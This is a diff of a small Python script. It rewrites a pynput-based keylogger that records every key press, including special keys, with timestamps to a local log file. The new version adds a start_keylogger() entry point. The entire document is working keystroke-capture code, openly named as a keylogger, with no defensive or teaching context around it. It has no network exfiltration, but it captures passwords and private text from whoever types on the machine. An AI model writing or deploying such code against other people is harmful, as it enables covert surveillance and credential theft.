@@ -1,23 +1,16 @@
-from pynput import keyboard
-from datetime import datetime
+from pynput.keyboard import Listener
 import logging
 
-# Setup logging
-logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 def on_press(key):
-    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
-
     try:
-        # Normal key
-        log_entry = f"{timestamp} [KEY: {key.char}]"
+        logging.info(f"Key {key.char}")
     except AttributeError:
-        # Special key
-        log_entry = f"{timestamp} [SPECIAL: {str(key).replace('Key.', '').upper()}]"
-
-    logging.info(log_entry)
-    print(log_entry)  # For real-time monitoring
-
-# Start listening
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+        logging.info(f"Special key {key}")
+def start_keylogger():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+        
+if __name__ == "__main__":
+    start_keylogger() 
